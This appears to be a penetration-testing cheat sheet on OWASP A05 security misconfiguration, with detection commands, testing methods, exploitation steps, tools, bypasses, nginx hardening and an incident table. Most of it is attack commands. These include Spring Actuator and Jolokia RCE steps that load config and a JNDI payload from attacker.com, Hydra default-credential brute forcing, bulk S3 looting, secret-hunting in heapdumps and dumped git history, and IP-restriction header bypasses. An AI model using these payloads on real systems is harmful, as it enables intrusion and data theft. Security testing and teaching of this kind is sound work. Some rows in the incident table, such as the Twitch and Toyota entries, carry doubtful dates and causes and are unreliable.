# A05: Security Misconfiguration

OWASP #5. 90% of applications tested had some misconfiguration.
CWEs: CWE-16, CWE-611, CWE-732, CWE-209.
Covers default configs, missing hardening, verbose errors, open cloud storage.

---

## Overview

Security misconfiguration is the most commonly seen issue—results from insecure
default configurations, incomplete or ad hoc configurations, open cloud storage,
misconfigured HTTP headers, and verbose error messages.

**Categories:**
- Default credentials / unchanged defaults
- Missing security headers
- Overly permissive CORS
- S3/cloud storage misconfig (public buckets)
- Verbose error messages (stack traces)
- Exposed management interfaces (admin panels, actuators, debug endpoints)
- Unnecessary features enabled (directory listing, sample apps)
- XML external entity processing enabled

---

## Detection Methods

```bash
# HTTP headers check
curl -I https://target.com | grep -E "X-Frame-Options|X-Content-Type|Content-Security-Policy|Strict-Transport|X-XSS"

# Nuclei templates - misconfiguration
nuclei -u https://target.com -t misconfiguration/ -t exposures/ -t default-logins/

# Directory listing
curl -s https://target.com/ | grep -i "index of"
ffuf -u https://target.com/FUZZ/ -w dirs.txt -mc 200 | grep "Index of"

# Spring Boot Actuator
curl https://target.com/actuator
curl https://target.com/actuator/env
curl https://target.com/actuator/beans
curl https://target.com/actuator/mappings

# phpinfo() exposure
curl https://target.com/phpinfo.php
curl https://target.com/info.php
curl https://target.com/test.php

# Exposed git repo
curl https://target.com/.git/config
curl https://target.com/.git/HEAD
git-dumper https://target.com/.git/ /tmp/repo

# S3 bucket enumeration
aws s3 ls s3://target-company-backup --no-sign-request
aws s3 ls s3://targetapp-uploads --no-sign-request
s3scanner scan --bucket-file buckets.txt
```

---

## What to Look For

**HTTP Headers (missing = misconfigured):**
- `Strict-Transport-Security` - HSTS
- `X-Frame-Options: DENY` - clickjacking protection
- `X-Content-Type-Options: nosniff` - MIME sniffing
- `Content-Security-Policy` - XSS/injection control
- `Permissions-Policy` - browser feature control
- `Referrer-Policy` - referrer information leak

**Verbose errors:**
- PHP errors with file paths: `Warning: include(/var/www/html/...`
- Stack traces with framework internals
- SQL error messages with query details
- Server version in headers: `Server: Apache/2.4.29 (Ubuntu)`

**Exposed endpoints:**
- `/admin`, `/administrator`, `/management`
- `/actuator`, `/actuator/env`, `/actuator/heapdump`
- `/api-docs`, `/swagger.json`, `/openapi.yaml`
- `/.git/`, `/.env`, `/config.php`, `/web.config`
- `/server-status` (Apache mod_status)
- `/phpmyadmin`, `/adminer`
- `/console` (H2, Hazelcast)
- `/.DS_Store` (macOS metadata)
- `/crossdomain.xml`, `/clientaccesspolicy.xml` (Flash legacy)

**Default credentials to try:**
```
admin:admin
admin:password
admin:admin123
root:root
admin:  (blank)
guest:guest
test:test
administrator:administrator
```

---

## Testing Methodology

### 1. HTTP Header Analysis
```bash
# Comprehensive header check
python3 -c "
import requests
r = requests.get('https://target.com')
headers = r.headers
checks = {
    'X-Frame-Options': 'MISSING - Clickjacking possible',
    'X-Content-Type-Options': 'MISSING - MIME sniffing possible',
    'Content-Security-Policy': 'MISSING - XSS risk',
    'Strict-Transport-Security': 'MISSING - No HSTS',
    'X-XSS-Protection': 'DEPRECATED but check value',
    'Referrer-Policy': 'MISSING - Referrer leak',
}
for h, msg in checks.items():
    if h not in headers:
        print(f'[!] {msg}')
    else:
        print(f'[+] {h}: {headers[h]}')
"

# Security headers grader
curl -s "https://securityheaders.com/?q=target.com&followRedirects=on" | \
  grep -E "grade|missing"

# Check server version disclosure
curl -I https://target.com | grep -iE "Server:|X-Powered-By:|X-AspNet-Version:"
```

### 2. Default Credential Testing
```bash
# Web admin panels
# Hydra against common admin panels:
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv \
  target.com http-post-form "/admin/login:username=^USER^&password=^PASS^:Login failed"

# Common default creds to manually test:
# Jenkins: admin:admin, admin:(blank), admin:password
# Tomcat: tomcat:tomcat, admin:admin, tomcat:s3cr3t
# phpMyAdmin: root:(blank), root:root
# Grafana: admin:admin
# Kibana: elastic:changeme
# Splunk: admin:changeme
# RabbitMQ: guest:guest
# MongoDB: (no auth by default on older versions)
# Redis: (no auth by default)

# Database default creds
mysql -h target.com -u root -p''
mysql -h target.com -u admin -padmin
psql -h target.com -U postgres -W  # default no password
```

### 3. Cloud Storage Misconfig
```bash
# AWS S3 buckets
# Enumerate via:
# - SSL cert (SANs)
# - JS files referencing S3 URLs
# - Company name + common suffixes

for bucket in target-com target-backup target-uploads target-assets target-static; do
  result=$(aws s3 ls s3://$bucket --no-sign-request 2>&1)
  if echo "$result" | grep -qv "AccessDenied\|NoSuchBucket"; then
    echo "[OPEN] s3://$bucket"
    echo "$result" | head -5
  fi
done

# Check bucket ACL
aws s3api get-bucket-acl --bucket TARGET_BUCKET --no-sign-request
aws s3api get-bucket-policy --bucket TARGET_BUCKET --no-sign-request

# Google Cloud Storage
gsutil ls gs://target-backup 2>&1
curl https://storage.googleapis.com/TARGET_BUCKET/

# Azure Blob Storage
az storage container list --account-name ACCOUNT --public-access blob
curl https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list

# Tools
s3scanner --bucket-file buckets.txt --dump
CloudBrute -d target.com -k target -t 80 -T 10
```

### 4. Exposed Admin Interfaces
```bash
# Spring Boot Actuator
for endpoint in env beans mappings heapdump threaddump metrics info health; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://target.com/actuator/$endpoint)
  echo "$STATUS /actuator/$endpoint"
done

# Heapdump (extracts memory → passwords, secrets)
curl https://target.com/actuator/heapdump > heap.hprof
# Analyze:
strings heap.hprof | grep -iE "password|secret|token|key"
# Or use Eclipse MAT / VisualVM

# phpinfo()
curl "https://target.com/phpinfo.php" | grep -E "DOCUMENT_ROOT|PHP_VERSION|config"

# Server-status (Apache)
curl "https://target.com/server-status"
curl "https://target.com/server-info"

# Kubernetes dashboard (if exposed)
curl -k https://target.com:8443/api/v1/namespaces
kubectl --server https://target.com:6443 get pods --all-namespaces

# Exposed git repo
git-dumper https://target.com/.git/ /tmp/dumped_repo
cd /tmp/dumped_repo && git log --all --oneline
git diff HEAD~1 HEAD  # recent changes might show removed secrets
```

### 5. Verbose Error Exploitation
```bash
# Trigger errors to reveal info
# PHP path disclosure:
curl "https://target.com/page.php?param[]="   # Array in string context

# SQL error disclosure:
curl "https://target.com/item?id='"    # SQL error with query
curl "https://target.com/item?id=1 WAITFOR DELAY '0:0:1'--"

# Stack trace exposure:
curl -H "Content-Type: application/json" -d "invalid json{" https://target.com/api/
curl -H "Accept: application/xml" https://target.com/api/users  # if XML not supported

# Directory listing
curl "https://target.com/images/"      # If no index.html
curl "https://target.com/uploads/"
curl "https://target.com/backup/"
```

---

## Exploitation Techniques

### Spring Boot Actuator → RCE
```bash
# 1. Check /actuator/env - look for datasource passwords, API keys
curl https://target.com/actuator/env | python3 -m json.tool | grep -i password

# 2. Change environment variable to inject malicious config
curl -X POST https://target.com/actuator/env \
  -H "Content-Type: application/json" \
  -d '{"name":"spring.cloud.bootstrap.location","value":"http://attacker.com/malicious.yml"}'

# 3. Refresh config (triggers Spring to load attacker config)
curl -X POST https://target.com/actuator/refresh

# 4. RCE via Jolokia (if exposed)
curl https://target.com/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.com!/logback.xml

# logback.xml (on attacker server):
# <configuration>
#   <insertFromJNDI env-entry-name="ldap://attacker.com:1389/exec" as="appName"/>
# </configuration>
```

### S3 Bucket Data Exfiltration
```bash
# List and download all public bucket contents
aws s3 sync s3://PUBLIC_BUCKET /tmp/loot --no-sign-request

# Look for:
find /tmp/loot -name "*.env" -o -name "*.config" -o -name "*.key" -o -name "*.pem"
grep -rn "password\|secret\|api_key\|token\|aws_access" /tmp/loot/ --include="*.txt" --include="*.json"
```

### Git Repo Extraction
```bash
# Full git repo dump
git-dumper https://target.com/.git/ /tmp/git_dump

# Extract all history including deleted files
cd /tmp/git_dump
git log --all --oneline
git stash list
# Checkout all commits to find secrets
for commit in $(git log --all --pretty=format:"%H"); do
  git show $commit | grep -iE "password|secret|api_key|token" && echo "Found in commit: $commit"
done
```

---

## Verification

```bash
# Verify missing headers
curl -I https://target.com 2>/dev/null | grep -c "X-Frame-Options\|Content-Security-Policy\|X-Content-Type"
# Expected: 3, if less → misconfigured

# Verify default creds
curl -s -d "user=admin&pass=admin" -c cookies.txt \
  https://target.com/admin/login -L | grep -i "dashboard\|welcome\|logout"
# If dashboard found → default creds accepted

# Verify open S3 bucket
aws s3 ls s3://BUCKET_NAME --no-sign-request
# If lists files without credentials → open bucket

# Verify stack trace exposure
curl "https://target.com/api/user?id=INVALID'" | \
  grep -iE "Error|Exception|Stack|Traceback|Warning"
# Should return generic error, not stack trace
```

---

## Common Problems & Solutions

| Misconfiguration | Risk | Fix |
|-----------------|------|-----|
| Missing security headers | XSS, clickjacking, sniffing | Add via web server config or middleware |
| Default credentials | Full compromise | Change ALL defaults before production |
| Open S3 bucket | Data breach | Block public access, use bucket policies |
| Spring Actuator exposed | RCE, credential theft | `/actuator` behind auth, disable heapdump |
| Verbose error messages | Info disclosure | Custom error pages, structured logging |
| Directory listing enabled | Reveals structure | Disable in Apache/Nginx config |
| .git/ exposed | Source code + secrets | .htaccess deny, Nginx block |
| phpinfo() accessible | PHP config disclosure | Remove from production |

---

## Tools (with Commands)

```bash
# Nuclei - misconfiguration templates
nuclei -u https://target.com -t misconfiguration/ -t exposures/ -t default-logins/ -o results.txt

# Nikto - web server scanner
nikto -h https://target.com -output nikto_report.txt

# Observatory (Mozilla)
curl https://http.observatory.mozilla.org/api/v1/analyze?host=target.com

# SecurityHeaders.com API
curl "https://securityheaders.com/?q=target.com&followRedirects=on&hide=on" | grep grade

# git-dumper
pip3 install git-dumper
git-dumper https://target.com/.git/ /tmp/repo

# s3scanner
s3scanner --bucket TARGET_BUCKET
s3scanner -b bucket_list.txt

# CloudBrute - cloud bucket enumeration
./CloudBrute -d target.com -k target -t 80

# dirsearch
python3 dirsearch.py -u https://target.com -e php,txt,conf,config,bak,backup,env

# feroxbuster
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

---

## Bypass Techniques

### Admin Panel Access Bypass
```bash
# IP restriction bypass
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-IP: 10.0.0.1
X-Remote-IP: 127.0.0.1

# Path confusion
/admin/../admin/
/ADMIN/
/admin%20/
//admin/
/./admin/
```

### S3 Bucket Policy Bypass
```bash
# List even when ListBucket denied (error-based enumeration)
# 403 = file exists but no access
# 404 = file doesn't exist
for filename in passwd shadow .env config.php; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    https://TARGET_BUCKET.s3.amazonaws.com/$filename)
  echo "$STATUS: $filename"
done
```

---

## Remediation

```nginx
# Nginx security headers
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-{NONCE}'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=()" always;
server_tokens off;

# Disable directory listing
autoindex off;

# Block .git access
location ~ /\.git {
    deny all;
    return 404;
}
```

---

## Real-World CVEs

| CVE / Incident | System | Misconfiguration | Impact |
|---------------|--------|-----------------|--------|
| Capital One 2019 | AWS WAF | Misconfigured firewall + SSRF | 100M records |
| 2017 Equifax | Apache Struts | Unpatched component | 147M SSNs |
| 2020 Toyota | GitHub | Exposed S3 credentials in public repo | 3.1M customer records |
| 2020 Twitch | Twitch | Default creds on internal server | 125GB source code |
| CVE-2020-1938 | Apache Tomcat AJP | Ghostcat - AJP connector default | File read, RCE |
| CVE-2022-22963 | Spring Cloud | Default expression evaluation | RCE |
| CVE-2019-10086 | Apache Beanutils | Default class access | RCE |
| Misconfigured MongoDB | Countless orgs | No auth by default (pre-3.x) | 400M+ records exposed |
